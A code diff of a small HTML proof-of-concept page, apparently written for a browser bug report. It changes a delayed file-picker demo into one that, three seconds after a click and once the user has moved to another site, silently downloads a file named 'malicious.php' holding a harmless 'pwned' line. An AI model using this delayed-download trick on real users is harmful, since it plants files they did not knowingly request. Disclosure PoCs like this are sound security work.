@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Delayed File Open Picker</title>
+  <title>Delayed Download PoC</title>
   <style>
     body {
       margin: 0;
@@ -18,7 +18,7 @@
     h1 {
       color: #333;
       text-align: center;
-      max-width: 400px;
+      max-width: 420px;
       padding: 20px;
     }
   </style>
@@ -26,41 +26,32 @@
 <body>
   <h1>
     Click me anywhere.<br>
-    Then browse to another site (e.g. hackerone.com)
+    Then browse to another site (e.g. hackerone.com).<br><br>
+    After 3 seconds, a file will be downloaded.
   </h1>
 
   <script>
-    document.addEventListener('click', async () => {
-      setTimeout(async () => {
-        if ('showOpenFilePicker' in window) {
-          try {
-            const [fileHandle] = await window.showOpenFilePicker({
-              multiple: false,
-              types: [
-                {
-                  description: 'Text Files',
-                  accept: {
-                    'text/plain': ['.txt', '.log', '.php']
-                  }
-                }
-              ]
-            });
+    document.addEventListener('click', () => {
+      setTimeout(() => {
+        // Create fake file
+        const blob = new Blob(['<?php echo "pwned"; ?>'], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
 
-            // Read file content (optional, for demo)
-            const file = await fileHandle.getFile();
-            const content = await file.text();
+        // Create invisible download link
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'malicious.php';
+        document.body.appendChild(a);
 
-            console.log("Selected file:", file.name);
-            console.log("Content:", content);
+        // Trigger download
+        a.click();
 
-          } catch (err) {
-            // User cancel / error
-            console.log("User canceled or error:", err);
-          }
-        } else {
-          alert("showOpenFilePicker not supported in this browser.");
-        }
-      }, 3000); // delay 3 detik
+        // Cleanup
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+
+        console.log("Download triggered");
+      }, 3000);
     }, { once: true });
   </script>
 </body>
